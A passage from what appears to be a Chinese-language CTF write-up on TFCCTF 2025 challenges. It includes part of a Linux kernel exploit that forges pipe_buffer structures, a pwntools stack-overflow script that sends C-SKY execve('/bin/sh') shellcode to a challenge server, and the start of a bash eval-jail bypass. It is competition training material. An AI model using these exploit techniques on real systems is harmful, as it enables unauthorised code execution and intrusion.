</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>kernel_base</span> <span class=o>=</span> <span class=n>out</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x6128c0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>fsrc</span> <span class=o>=</span> <span class=p>(</span><span class=n>out</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>lss</span><span class=p>(</span><span class=s>&#34;kernel_base&#34;</span><span class=p>,</span> <span class=n>kernel_base</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>//pause();
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>flag_addr</span> <span class=o>=</span> <span class=p>(</span><span class=n>out</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFF000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>flag_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>edit</span><span class=p>(</span><span class=o>-</span><span class=mh>0x400</span><span class=o>*</span><span class=n>tmp</span><span class=p>,</span><span class=mi>1</span> <span class=o>+</span> <span class=mh>0x400</span><span class=o>*</span><span class=n>tmp</span><span class=p>,(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>out</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>//read(pfd[i][1],(char*)ptr,0x100);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>tmp_fd_idx</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mh>0x81</span><span class=p>;</span><span class=n>i</span><span class=o>&lt;</span><span class=mh>0x100</span><span class=p>;</span><span class=n>i</span><span class=o>+=</span><span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp_fd_idx</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>read</span><span class=p>(</span><span class=n>pfd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>,</span><span class=mh>0x400</span><span class=p>);</span> <span class=c1>// 这里 是看看相邻的是不是 pipe_buffer  结构体，
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span><span class=p>(((</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=mh>0x5959595959595959</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nf>hexdump</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>,</span><span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>lss</span><span class=p>(</span><span class=s>&#34;tmp_fd_idx&#34;</span><span class=p>,</span> <span class=n>tmp_fd_idx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>base</span> <span class=o>=</span> <span class=p>(</span><span class=n>out</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFF000000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>tmp_buf</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0xFFF</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=o>*</span><span class=n>pb</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;read...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kt>size_t</span> <span class=n>target_mask</span> <span class=o>=</span> <span class=n>j</span> <span class=o>*</span> <span class=mh>0x1000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>target_mask</span> <span class=o>&gt;&gt;=</span> <span class=mh>0xC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>target_mask</span> <span class=o>&lt;&lt;=</span> <span class=mh>0x6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>pb</span><span class=o>-&gt;</span><span class=n>page</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>target_mask</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>pb</span><span class=o>-&gt;</span><span class=n>offset</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>pb</span><span class=o>-&gt;</span><span class=n>len</span> <span class=o>=</span> <span class=mh>0x800</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>pb</span><span class=o>-&gt;</span><span class=n>ops</span> <span class=o>=</span> <span class=n>kernel_base</span> <span class=o>+</span> <span class=mh>0x6128c0</span><span class=p>;</span> <span class=c1>//pipe_buf_ops
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>pb</span><span class=o>-&gt;</span><span class=n>flags</span> <span class=o>=</span> <span class=mh>0x10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>//out[0] = (fsrc &amp; 0xFFFFFFFFFF000000);// + target_mask;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>edit</span><span class=p>(</span><span class=o>-</span><span class=mh>0x400</span><span class=o>*</span><span class=n>tmp</span><span class=p>,</span><span class=mi>1</span> <span class=o>+</span> <span class=mh>0x400</span><span class=o>*</span><span class=n>tmp</span><span class=p>,(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>pb</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>//puts(&#34;edit&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//pause();
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>read</span><span class=p>(</span><span class=n>pfd</span><span class=p>[</span><span class=n>tmp_fd_idx</span><span class=p>][</span><span class=mi>0</span><span class=p>],(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>,</span><span class=mh>0x700</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>//hexdump((unsigned char*)ptr,0x40);
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//pause();
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=n>ptr</span><span class=p>[</span><span class=mh>0x560</span><span class=o>/</span><span class=mi>8</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFF</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0x434654</span> <span class=o>||</span> <span class=p>(</span><span class=n>ptr</span><span class=p>[</span><span class=mh>0x560</span><span class=o>/</span><span class=mi>8</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFF</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0x465443</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>puts</span><span class=p>((</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>ptr</span><span class=p>[</span><span class=mh>0x560</span><span class=o>/</span><span class=mi>8</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>j</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>extern</span> <span class=kt>void</span> <span class=nf>_start</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>env</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>environ</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=o>&amp;</span><span class=n>env</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>doMain</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nf>syscall64</span><span class=p>(</span><span class=mi>60</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=mucusky>MUCUSKY</h2><p>下载一个ghida插件</p><p><a href=https://github.com/leommxj/ghidra_csky>https://github.com/leommxj/ghidra_csky</a></p><p>栈溢出</p><p><img src=/img/2025-TFCCTF/4.png alt=1></p><p>后面就是 调试工具了可以从这里下载到</p><p><a href=https://gitee.com/swxu/csky-elfabiv2-tools>https://gitee.com/swxu/csky-elfabiv2-tools</a></p><p>后面经过测试发现 stack 地址 貌似是固定的</p><p>然后 ret2shellcode</p><p>要注意的是 有些字符不能发送，不然会截断？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=err>!</span><span class=p>[</span><span class=mi>5</span><span class=p>](</span><span class=o>/</span><span class=n>img</span><span class=o>/</span><span class=mi>2025</span><span class=o>-</span><span class=n>TFCCTF</span><span class=o>/</span><span class=mf>5.</span><span class=n>png</span><span class=p>)</span><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;1.1.11 123&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#cmd = &#39;env -i ./qemu -g 1234 ./mucusuki&#39;</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=s1>&#39;env -i ./qemu ./mucusuki&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#io = process(cmd.split(&#39; &#39;))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=s1>&#39;mucusuki-8b05dc5f3ea795f2.challs.tfcctf.com 1337&#39;</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>cmd</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>),</span><span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#cmd = &#39;127.0.0.1 1337&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#io = remote(*cmd.split(&#39; &#39;))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sc</span>  <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#sc += &#39;0c ea 50 81  30 78 0c&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#sc  += &#39;7b6c 2214   0032 0033 f230 0dea 1083 3478&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span>  <span class=o>+=</span> <span class=s1>&#39;7b6c 2214   0032 0033 f230 0cea 1083 3078&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#sc  += &#39; 7b6c 2015   0032 0033 f230 0dea 1083 3478&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>sc</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=n>sc</span>
</span></span><span class=line><span class=cl><span class=n>pay</span>  <span class=o>=</span> <span class=n>pay</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p32(0x3ffff348)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p32(0x3ffffe88)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x3ffffecc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p32(0x00008162)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p32(0x000008150)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += p32(0x42424242)</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += b&#39;C&#39; * 0x10</span>
</span></span><span class=line><span class=cl><span class=c1>#pay += sc</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>pay</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>构造shellcode，由于不太清楚这个架构的 系统调用号</li></ul><p>Elf 里面的 read 系统调用号是 0x54</p><p><img src=/img/2025-TFCCTF/5.png alt=1></p><p>而 linux 源码里面的是 64 <a href=https://github.com/c-sky/linux-4.9.y>https://github.com/c-sky/linux-4.9.y</a></p><p>>&#187; 0x54-63</p><p>21</p><p>相差21</p><p><img src=/img/2025-TFCCTF/6.png alt=1></p><p>那么 正确的 execve调用号 可能也是 差 21</p><p>>&#187; 221+21</p><p>242</p><p><img src=/img/2025-TFCCTF/7.png alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=o>.</span><span class=n>section</span> <span class=o>.</span><span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=o>.</span><span class=n>globl</span> <span class=n>_start</span>
</span></span><span class=line><span class=cl><span class=n>_start</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>mov</span> <span class=n>r1</span><span class=p>,</span><span class=n>r14</span> <span class=p>;</span>  <span class=o>/</span><span class=nb>bin</span><span class=o>/</span><span class=n>sh</span>
</span></span><span class=line><span class=cl>    <span class=n>subi</span> <span class=n>sp</span><span class=p>,</span> <span class=n>sp</span> <span class=p>,</span><span class=mh>0x8</span>
</span></span><span class=line><span class=cl>    <span class=n>movi</span> <span class=n>r2</span><span class=p>,</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>movi</span> <span class=n>r3</span><span class=p>,</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>movi</span> <span class=n>r0</span><span class=p>,</span><span class=mh>0xf2</span> <span class=p>;</span><span class=mi>242</span> <span class=n>execve</span>
</span></span><span class=line><span class=cl>    <span class=n>movi</span> <span class=n>r12</span><span class=p>,</span><span class=mh>0x8310</span> <span class=p>;</span> <span class=n>syscall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>jmp</span> <span class=n>r12</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-TFCCTF/8.png alt=1></p><p><img src=/img/2025-TFCCTF/9.png alt=1></p><h1 id=misc>Misc</h1><h2 id=minijail>MINIJAIL</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> ubuntu:20.04</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>DEBIAN_FRONTEND</span><span class=o>=</span>noninteractive
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>RUN</span> apt-get update <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span> <span class=o>&amp;&amp;</span> apt-get install -y --no-install-recommends bash socat <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span> <span class=o>&amp;&amp;</span> rm -rf /var/lib/apt/lists/*<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /app</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> yo_mama .<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> flag.txt /tmp/flag.txt<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> <span class=nv>random_file</span><span class=o>=</span><span class=k>$(</span>mktemp /flag.XXXXXX<span class=k>)</span> <span class=o>&amp;&amp;</span> mv /tmp/flag.txt <span class=s2>&#34;</span><span class=nv>$random_file</span><span class=s2>&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> chmod +x yo_mama<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENTRYPOINT</span> <span class=p>[</span><span class=s2>&#34;socat&#34;</span><span class=p>,</span> <span class=s2>&#34;TCP-LISTEN:4444,reuseaddr,fork&#34;</span><span class=p>,</span> <span class=s2>&#34;EXEC:./yo_mama yooooooo_mama_test,pty,stderr&#34;</span><span class=p>]</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>先看到Dockerfile里面有个奇怪的启动项，看<code>yo_mama</code>这个程序</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>goog</span><span class=o>=</span><span class=s1>&#39;^[$&gt;_=:!(){}]+$&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -n <span class=s2>&#34;caca</span>$<span class=s2> &#34;</span>
</span></span><span class=line><span class=cl>    stty -echo
</span></span><span class=line><span class=cl>    <span class=nb>read</span> -r mine
</span></span><span class=line><span class=cl>    stty <span class=nb>echo</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[[</span> <span class=nv>$mine</span> <span class=o>=</span>~ <span class=nv>$goog</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nb>eval</span> <span class=s2>&#34;</span><span class=nv>$mine</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s1>&#39;[!] Error: forbidden characters detected&#39;</span>
</span></span><span class=line><span class=cl>        <span class=nb>printf</span> <span class=s1>&#39;\n&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>看到白名单，很有php无字母参数RCE那个味道，只要满足就<code>eval</code>执行，最重要的就是0和1，再切片就可以了</p><p>取 <code>$1</code> 和 <code>$_</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>_</span><span class=o>=</span><span class=k>$((</span>!_____<span class=k>))</span>
</span></span><span class=line><span class=cl><span class=nv>__</span><span class=o>=</span><span class=si>${</span><span class=p>!_</span><span class=si>}</span>
</span></span><span class=line><span class=cl><span class=nv>___</span><span class=o>=</span><span class=nv>$_</span>
</span></span></code></pre></td></tr></table></div></div><p><code>__</code> 应该是 <code>yooooooo_mama_test</code>，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=si>${</span><span class=nv>___</span><span class=si>}</span><span class=k>$(</span><span class=nv>$_</span><span class=k>)</span><span class=si>${</span><span class=nv>__</span><span class=si>}</span>
